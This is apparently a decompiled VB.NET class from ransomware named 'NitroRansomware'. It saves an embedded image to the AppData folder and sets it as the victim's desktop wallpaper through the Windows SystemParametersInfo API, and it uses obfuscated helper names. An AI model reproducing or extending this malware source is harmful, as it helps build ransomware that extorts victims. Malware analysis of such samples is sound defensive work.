Imports System
Imports System.Runtime.InteropServices
Imports dg3ypDAonQcOidMs0w
Imports NitroRansomware.Properties
Imports rE4lpnT863QnijKQK5

Namespace NitroRansomware
	' Token: 0x0200000B RID: 11
	Friend Class Wallpaper
		' Token: 0x06000040 RID: 64
		Public Declare Auto Function SystemParametersInfo Lib "user32.dll" (uAction As UInteger, uParam As Integer, lpvParam As String, fuWinIni As UInteger) As Integer

		' Token: 0x06000041 RID: 65 RVA: 0x00004FF8 File Offset: 0x000031F8
		Public Shared Sub ChangeWallpaper()
			Dim folderPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
			Wallpaper.fileName = folderPath + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(5408)
			Resources.wl.Save(Wallpaper.fileName)
			Wallpaper.SystemParametersInfo(Wallpaper.SPI_SETWALL, 0, Wallpaper.fileName, Wallpaper.SPIF_UPDATE Or Wallpaper.SPIF_SWEDWINI)
		End Sub

		' Token: 0x06000042 RID: 66 RVA: 0x00002243 File Offset: 0x00000443
		Public Sub New()
			hHEYokUTtehNq5ji0d.LQgF529zBT6Ox()
			MyBase..ctor()
		End Sub

		' Token: 0x06000043 RID: 67 RVA: 0x000023E6 File Offset: 0x000005E6
		' Note: this type is marked as 'beforefieldinit'.
		Shared Sub New()
			WP6RZJql8gZrNhVA9v.iXLoKRSpAw()
			hHEYokUTtehNq5ji0d.LQgF529zBT6Ox()
			Wallpaper.SPI_SETWALL = 20UI
			Wallpaper.SPIF_UPDATE = 1UI
			Wallpaper.SPIF_SWEDWINI = 2UI
		End Sub

		' Token: 0x0400003A RID: 58
		Private Shared SPI_SETWALL As UInteger

		' Token: 0x0400003B RID: 59
		Private Shared SPIF_UPDATE As UInteger

		' Token: 0x0400003C RID: 60
		Private Shared SPIF_SWEDWINI As UInteger

		' Token: 0x0400003D RID: 61
		Private Shared fileName As String
	End Class
End Namespace
